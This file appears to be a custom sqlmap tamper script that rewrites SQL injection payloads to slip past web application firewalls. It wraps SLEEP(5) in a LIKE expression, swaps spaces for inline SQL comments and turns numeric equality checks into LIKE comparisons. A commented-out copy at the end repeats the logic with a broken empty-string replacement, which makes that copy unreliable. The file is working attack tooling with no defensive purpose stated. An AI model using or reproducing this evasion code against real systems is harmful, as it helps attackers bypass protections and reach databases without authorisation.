#!/usr/bin/env python

import re
from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING

__priority__ = PRIORITY.LOWEST

def tamper(payload, **kwargs):
	if payload:
		pass
	payload = payload.replace("SLEEP(5)","\"0\" LikE Sleep(5)")
	payload=payload.replace(" ","/*FFFFFFFFFFFFFFFFFFFFFFFFF*/")
	p = re.compile(r'(\d+)=')
	payload=p.sub(r"'\1' LikE ", payload)
	return payload


# import re
# from lib.core.enums import PRIORITY
# __priority__ = PRIORITY.LOW
# def tamper(payload):
# 	if payload:
# 		pass
# 	payload = payload.replace("SLEEP(5)","\"0\" LikE Sleep(5)")
# 	payload=payload.replace("","/*FFFFFFFFFFFFFFFFFFFFFFFFF*/")
# 	p = re.compile(r'(\d+)=')
# 	payload=p.sub(r"'\1' LikE ", payload)
# 	return payload